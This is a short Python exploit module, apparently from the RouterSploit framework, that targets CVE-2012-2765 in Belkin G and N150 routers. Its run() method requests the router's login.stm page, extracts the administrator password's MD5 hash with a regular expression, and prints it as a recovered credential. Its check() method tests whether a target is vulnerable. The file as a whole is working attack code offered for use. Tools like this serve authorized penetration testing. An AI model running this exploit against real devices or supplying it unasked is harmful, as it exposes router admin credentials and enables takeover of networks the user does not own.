# rsf exploit module
# description: Exploits Belkin G and N150 Password MD5 Disclosure vulnerability.

import re
import requests

class Exploit:
    __info__ = {
        "name": "Belkin G & N150 Password Disclosure",
        "description": "Module exploits Belkin G and N150 Password MD5 Disclosure vulnerability.",
        "authors": (
            "Aodrulez <f3arm3d3ar[at]gmail.com>",  # vulnerability discovery
            "Avinash Tangirala",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2765",
            "https://www.exploit-db.com/exploits/17349/",
        ),
        "devices": (
            "Belkin G",
            "Belkin N150",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            print("Exploit success")
            data = [('admin', val[0])]
            headers = ("Login", "MD5 Password")
            print(headers, data)

        else:
            print("Exploit failed. Device seems to be not vulnerable.")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/login.stm")
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable

